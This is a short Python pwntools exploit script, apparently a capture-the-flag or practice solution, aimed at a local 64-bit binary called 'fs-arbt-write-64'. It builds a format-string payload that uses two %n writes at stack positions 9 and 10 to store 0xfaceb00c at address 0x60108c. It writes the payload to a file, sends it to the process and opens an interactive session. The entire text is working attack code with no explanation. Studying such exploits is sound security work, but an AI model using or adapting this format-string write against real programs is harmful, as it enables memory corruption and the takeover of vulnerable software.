from pwn import *
p = process("./fs-arbt-write-64")

target_addr = 0x60108c
target_num  = 0xfaceb00c


front = target_num & 0xffff
front = front

back = (target_num >>16) - (front)
while back < 0:
    back += 0x10000

payload = "%" + "%05d" % front + "x%9$n"
payload = payload + "%" + "%05d" % back + "x%10$n0"
payload = payload + p64(target_addr) + p64(target_addr+2)

with open('x', 'w') as x:
    x.write(payload)

p.sendline(payload)

p.interactive()


